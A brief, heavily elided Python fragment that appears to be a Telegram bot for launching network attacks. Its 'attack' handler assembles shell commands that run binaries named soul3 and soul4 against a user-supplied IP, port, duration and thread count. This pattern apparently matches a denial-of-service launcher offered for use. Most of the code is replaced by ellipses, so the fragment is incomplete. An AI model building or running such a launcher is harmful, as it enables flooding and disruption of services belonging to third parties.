...
def get_user_and_host():
    try:
        ...
        # For example, if the bot detects a cloud-based platform like IntelliJ Cloud or cloudways
...
async def attack(update: Update, context: CallbackContext):
    ...
    if argument_type == 3:
        attack_command = f"./soul3 {ip} {port} {duration}"
    elif argument_type == 4:
        attack_command = f"./soul4 {ip} {port} {duration} {threads}"
